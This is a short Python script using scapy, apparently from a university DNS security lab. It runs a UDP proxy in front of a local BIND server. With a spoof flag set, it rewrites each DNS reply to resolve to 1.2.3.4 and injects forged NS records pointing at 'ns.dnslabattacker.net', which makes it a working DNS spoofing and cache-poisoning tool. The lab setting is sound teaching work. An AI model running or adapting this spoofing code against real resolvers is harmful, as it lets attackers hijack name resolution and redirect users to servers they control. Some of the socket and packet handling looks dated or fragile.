
#!/usr/bin/env python
import argparse
import socket
from scapy.all import *

# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument("--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true", help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Port to run the proxy on
port = args.port
print('port: ', port)
# BIND's port
dns_port = args.dns_port
print('dns_port aka binds port: ', dns_port)
# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response

#BIND'S address
bindAddr = "127.0.0.1"


def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.bind((bindAddr, port))
    while True:
        #listening on client's DNS request
        digRequest, digAddr = sock.recvfrom(1024)
        dnsData = DNS(digRequest)
        # Forward the reponds to BIND for response
        sock.sendto(str(dnsData),(bindAddr, dns_port))
        after_packet = DNS(sock.recv(1024))
        # Spoof enabeld for changing the package
        if SPOOF:
            #change the after packet
            #get the DNS query domain name
            after_packet[DNS].an = DNSRR(rrname=after_packet[DNSQR].qname, rdata="1.2.3.4")
            after_packet[DNS].ancount = 1
            after_packet[DNS].ns = DNSRR(rrname=after_packet[DNSQR].qname, type='NS', rdata="ns.dnslabattacker.net") / DNSRR(rrname=after_packet[DNSQR].qname, type='NS', rdata="ns.dnslabattacker.net")
            after_packet[DNS].nscount = 2
        # Sending the response to the dig
        sock.sendto(str(after_packet),(digAddr[0],digAddr[1]))


if __name__ == '__main__':
    main()
